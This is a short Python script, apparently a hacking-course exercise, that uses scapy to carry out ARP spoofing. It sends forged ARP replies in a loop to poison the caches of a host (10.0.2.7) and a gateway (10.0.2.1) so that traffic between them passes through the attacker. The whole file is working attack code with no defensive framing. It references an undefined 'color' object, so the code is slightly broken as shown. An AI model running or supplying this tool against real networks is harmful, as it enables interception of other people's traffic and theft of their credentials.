#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    print(color.GREEN_BOLD + "[+] Scanning Network " + color.END + ip)
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count = 0
try:
    while True:
        spoof("10.0.2.7", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.7")
        sent_packets_count += 2
        # Here I change for use in Python 3
        # print("\r[+] Sent packets: " + str(sent_packets_count)),
        print("\r[+] Sent packets: " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detect CTRL + C .... Quitting." )

